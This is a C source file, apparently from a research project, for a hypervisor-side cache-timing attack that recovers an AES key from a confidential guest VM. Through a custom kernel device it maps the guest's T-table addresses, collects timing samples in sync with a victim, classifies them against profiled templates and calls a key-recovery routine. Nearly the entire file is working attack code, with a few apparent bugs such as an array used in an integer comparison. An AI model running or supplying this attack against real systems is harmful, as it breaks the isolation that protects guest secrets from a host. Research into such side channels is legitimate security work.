#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <sched.h>
#include <math.h>
#include "../../host-module/main.h"
#include "../../host-utils/user-utils.h"
#include "recover.h"

char ROOT_DIR[128] = {0};
static int N_attack = 0;

int samples[SAMPLE_N] = {0};
int d_range_lower_bound[4] = {0};
int d_range_upper_bound[4] = {0};
long double gaussian_hist_access_m[4][SAMPLE_N] = {0};
long double gaussian_hist_not_access_m[4][SAMPLE_N] = {0};

uint64_t table_gPA[4];
uint64_t table_ptr[4];
uint64_t trigger_gPA;
uint64_t trigger_ptr;

void get_gPAs(){
    FILE *fptr;
    char filename[1024] = {0};
    sprintf(filename, "%s/aes-attack/gpas/address", ROOT_DIR);
    fptr = fopen(filename, "r");
    fscanf(fptr, "%lx%lx%lx%lx", &table_gPA[0], &table_gPA[1], &table_gPA[2], &table_gPA[3]);
    fscanf(fptr, "%lx", &trigger_gPA);
    fclose(fptr);
}

int get_attack_config(char *d_range_config, int *ret){
    char tmp[1024] = {0};
    sprintf(tmp, "%s/aes-profile/templates/d-range-lowerbounds.json", ROOT_DIR);
    FILE* file = fopen(tmp, "r");
    if (file == NULL) {
        fprintf(stderr, "Error opening JSON file.\n");
            return 1;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char* json_data = (char*)malloc(file_size + 1);
    fread(json_data, 1, file_size, file);
    json_data[file_size] = '\0';
    fclose(file);

    cJSON* root = cJSON_Parse(json_data);
    if (root == NULL) {
        const char* error_ptr = cJSON_GetErrorPtr();
        if (error_ptr != NULL) {
            fprintf(stderr, "Error parsing JSON: %s\n", error_ptr);
        }
        free(json_data);
        return 1;
    }

    cJSON* value = cJSON_GetObjectItemCaseSensitive(root, d_range_config);
    if (cJSON_IsNumber(value)){
        *ret = value->valueint;
    }

    cJSON_Delete(root);
    free(json_data);
    return 0;
}

void parse_args(int argc, char *argv[]){
    int opt;
    enum { CHARACTER_MODE, WORD_MODE, LINE_MODE } mode = CHARACTER_MODE;
    while ((opt = getopt(argc, argv, "n:")) != -1) {
           switch (opt) {
           case 'n': {
            N_attack = atoi(optarg);
            break;
        }
           default: {
            fprintf(stderr, "Usage: %s [] [file...]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
        }
    }
}

int set_uc(int host_module_fd, uint64_t adrs){
    struct kernel_ptr_request req;
    req.ptr = adrs;
    ioctl(host_module_fd, SET_UC, (uint64_t)&req);
    return 0;
}

int set_c(int host_module_fd, uint64_t adrs){
    struct kernel_ptr_request req;
    req.ptr = adrs;
    ioctl(host_module_fd, SET_C, (uint64_t)&req);
    return 0;
}

int main(int argc, char *argv[]){
    get_data_from_json(ROOT_DIR);
    parse_args(argc, argv);
    for(int te = 0; te < 4; te++){
        char d_range_config[1024] = {0};
        sprintf(d_range_config, "d_range_lowerbound_Te%d", te);
        get_attack_config(d_range_config, &d_range_lower_bound[te]);
    }

    for(int te = 0; te < 4; te++){
        char filename[1024] = {0};
        sprintf(filename, "%s/aes-profile/templates/gaussian_hist_Te%d_access_m", ROOT_DIR, te);
        FILE *gaussian_fptr = fopen(filename, "r");
        for(int i = 0; i < SAMPLE_N; i++){
            fscanf(gaussian_fptr, "%Lf", &gaussian_hist_access_m[te][i]);
        }
        fclose(gaussian_fptr);
        sprintf(filename, "%s/aes-profile/templates/gaussian_hist_Te%d_not_access_m", ROOT_DIR, te);
        gaussian_fptr = fopen(filename, "r");
        for(int i = 0; i < SAMPLE_N; i++){
            fscanf(gaussian_fptr, "%Lf", &gaussian_hist_not_access_m[te][i]);
        }
        fclose(gaussian_fptr);
    }

    get_gPAs();

    int host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    if(host_module_fd == -1){
        printf("Error in opening file \n");
        exit(-1);
    }

    for(int i = 0; i < 4; i++){
        struct kernel_ptr_request req;
        req.gpa = table_gPA[i];
        ioctl(host_module_fd, GET_KERNEL_PTR_SNP, (uint64_t)&req);
        table_ptr[i] = req.ptr;
    }

#if NOCACHE == 1
    if(set_uc(host_module_fd, table_ptr[0]) < 0){
        return -1;
    }
#endif

    struct kernel_ptr_request req;
    req.gpa = trigger_gPA;
    ioctl(host_module_fd, GET_KERNEL_PTR, (uint64_t)&req);
    trigger_ptr = req.ptr;


    // Initial sync
    host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    sync_write(host_module_fd, trigger_ptr, HYPERVISOR_TRIGGER);
    while(1){
        if(sync_read(host_module_fd, trigger_ptr) != HYPERVISOR_TRIGGER){
            break;
        }
    }
    close(host_module_fd);

    for(int te = 0; te < 4; te++){
        for(int i = 0; i < N_attack; i++){
            int vm_has_executed = 0;
            host_module_fd = open("/dev/hyperattacker", O_RDONLY);

            struct attack_request req;
            req.addr = table_ptr[te];
            req.trigger = trigger_ptr;
            req.number = SAMPLE_N;
            req.ret = 0;
            ioctl(host_module_fd, ATTACK_WITH_TRIGGER, (uint64_t)&req);
            vm_has_executed = req.ret;

            // Wait until the victim finished
            while(1){
                if(sync_read(host_module_fd, trigger_ptr) != HYPERVISOR_TRIGGER){
                    break;
                }
            }

            // Check if the victim had finished before the hypervisor finished.
            if(vm_has_executed == 0){
                // send a failure signal to the victim and wait unitl the victim responds.
                sync_write(host_module_fd, trigger_ptr, RESTART);
                while(sync_read(host_module_fd, trigger_ptr) == RESTART){
                }
                // run again.
                i--;
                close(host_module_fd);
                continue;
            }else{
                // send a success signal to the victim and wait unitl the victim responds.
                sync_write(host_module_fd, trigger_ptr, NEXT);
                while(sync_read(host_module_fd, trigger_ptr) == NEXT){
                }
            }

            // Store the resulting timing samples.
            struct sample_request sample_req;
            sample_req.addr = (uint64_t)samples;
            sample_req.number = SAMPLE_N;
            ioctl(host_module_fd, SAMPLES_COPY_TO_USER, (uint64_t)&sample_req);

            close(host_module_fd);

            // Count the number d-range-bounded loads.
            int in_d_range_count = 0;
            for(int j = 0; j < SAMPLE_N; j++){
                if(samples[j] >= d_range_lower_bound[te] && samples[j] < d_range_upper_bound){
                    in_d_range_count++;
                }
            }

            // Compare the PDF values.
            if(gaussian_hist_not_access_m[te][in_d_range_count] > gaussian_hist_access_m[te][in_d_range_count]){
                is_access_m[te][i] = 0;
            }else{
                is_access_m[te][i] = 1;
            }

            printProgressBar(te * N_attack + (i + 1), 4 * N_attack, 50);
        }
    }
    printf("\n");
    recover_key(N_attack);

#if NOCACHE == 1
    if(set_c(host_module_fd, table_ptr[0]) < 0){
        return -1;
    }
#endif

    host_module_fd = open("/dev/hyperattacker", O_RDONLY);
    sync_write(host_module_fd, trigger_ptr, TERMINATE);
    while(1){
        if(sync_read(host_module_fd, trigger_ptr) != TERMINATE){
            break;
        }
    }
    close(host_module_fd);
    return 0;
}


